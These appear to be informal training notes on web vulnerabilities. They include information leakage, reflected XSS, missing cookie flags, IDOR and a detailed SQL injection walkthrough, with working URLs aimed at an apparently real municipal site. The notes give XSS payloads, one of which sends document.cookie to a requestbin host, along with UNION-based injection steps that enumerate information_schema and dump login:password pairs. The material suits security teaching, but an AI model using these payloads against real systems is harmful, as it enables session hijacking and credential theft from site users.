1- information leakage
http://www.e-commune.org/index.php?cat=gestion-du-site&ncat=3
http://www.e-commune.org/index.php?cat=gestion-du-site&ncat=4

2- Cross-Site Scripting
http://www.e-commune.org/index.php?cat=gestion-du-site&ncat=aa;<script>alert(1)</script>aaa
http://www.e-commune.org/index.php?cat=gestion-du-site&ncat=aa;<script>alert(document.cookieœ)</script>aaa
<script type="text/javascript">
document.location='http://requestbin.fullcontact.com/1d3hlty1?c='+document.cookie;
</script>

3- HTTPOnly and Secure flags not used for cookies
a- cookie will be stolen from network traffic => "Secure" flag will prevent the cookie from being sent over HTTP. It will only be sent over HTTPS instead!
b- cookie can be manipulted by Javascript => "HTTPOnly" will prevent javascript from stealing it.

4- Bad user profile segregation/separation
http://www.e-commune.org/index.php?cat=&ncat=20&rub=messages&nrub=21&srub=recus&nsrub=23&id_user=1 => admin
http://www.e-commune.org/index.php?cat=&ncat=20&rub=messages&nrub=21&srub=recus&nsrub=23&id_user=8 => chef

5- SQL injection

SELECT * FROM users => give you all the columns of the table "users"

SELECT * FROM users WHERE name = "Adel"

Firefox:
URL : www.a.com/page.php?id=1234

Server :
page.php :
	<?php
	var myID = $_GET['id'];
	echo $myID;

	var my_SQL_query = "SELECT * FROM users WHERE id = $myID";
	
	if (check_permission($myID) {
		var results = mysql_query_function(my_SQL_query);
		echo $results;
	}
	else echo "ERROR: not permitted";
	?>

SELECT * FROM users WHERE name = $myID


SELECT * FROM users WHERE name = 1
SELECT * FROM users WHERE name = a => syntax error
SELECT * FROM users WHERE name = "a" => OK

SELECT * FROM users WHERE name = 1 or any other ID => syntax erro
SELECT * FROM users WHERE (name = -1 or true) => SELECT * FROM users
SELECT * FROM users WHERE (name = -1 or 1=1œ) => SELECT * FROM users

http://www.e-commune.org/index.php?cat=&ncat=52%20or%20true&rub=vivre-ensemble&nrub=60%20OR%20true

var myLogin = $_POST['login'];
var myPassword = $_POST['pass'];

SELECT * FROM users WHERE login = "$myLogin" AND password = "$myPassword"

comments :
	//
	/* comment */
	--
	#

SELECT * FROM users WHERE login = "admin#" AND password = "aaaaa" => fail because # is part of the login
SELECT * FROM users WHERE login = "admin"#" AND password = "aaaaa" => 
SELECT * FROM users WHERE login = 'admin'#' AND password = "aaaaa" => 

SELECT * FROM users WHERE name = 1 UNION .....
SELECT * FROM users WHERE name = "admin" UNION .....#"

SELECT * FROM users => 3 columns
UNION
SELECT * FROM someTable => 4 columns
===> FAIL


SELECT * FROM users WHERE id = $myID
SELECT * FROM users WHERE id = nonExistingValue (eg. 0, -1, ...)


SELECT 1 => returns 1 column containing the value 1
SELECT 1, "adel" => returns 2 column containing the value 1, "adel"


SELECT * FROM users WHERE id = -1 UNION SELECT login,password FROM usersTable

SELECT * FROM users WHERE id = -1 UNION SELECT 1
SELECT * FROM users WHERE id = -1 UNION SELECT 1,2
SELECT * FROM users WHERE id = -1 UNION SELECT 1,2,3
SELECT * FROM users WHERE id = -1 UNION SELECT 1,2,3,4,5,6,7,8,9 => works and prints 8
SELECT * FROM users WHERE id = -1 UNION SELECT 1,2,3,4,5,6,7,version(),9 => gets mysql version
SELECT * FROM users WHERE id = -1 UNION SELECT 1,2,3,4,5,6,7,version(),9 => asking information_schema
SELECT * FROM users WHERE id = -1 UNION SELECT 1,2,3,4,5,6,7,table_name,9 FROM information_schema.tables => asking information_schema => we obtained the usersTable name = "utilisateur"
SELECT * FROM users WHERE id = -1 UNION SELECT 1,2,3,4,5,6,7,column_name,9 FROM information_schema.columns WHERE table_name = "utilisateur" => asking information_schema => we obtained the username and password columns names which are : "login" and "password"
SELECT * FROM users WHERE id = -1 UNION SELECT 1,2,3,4,5,6,7,login,9 FROM utilisateur => gets the login of each userœ
SELECT * FROM users WHERE id = -1 UNION SELECT 1,2,3,4,5,6,7,concat(login, ":", password),9 FROM utilisateur => gets the login:password
=> SQLMap


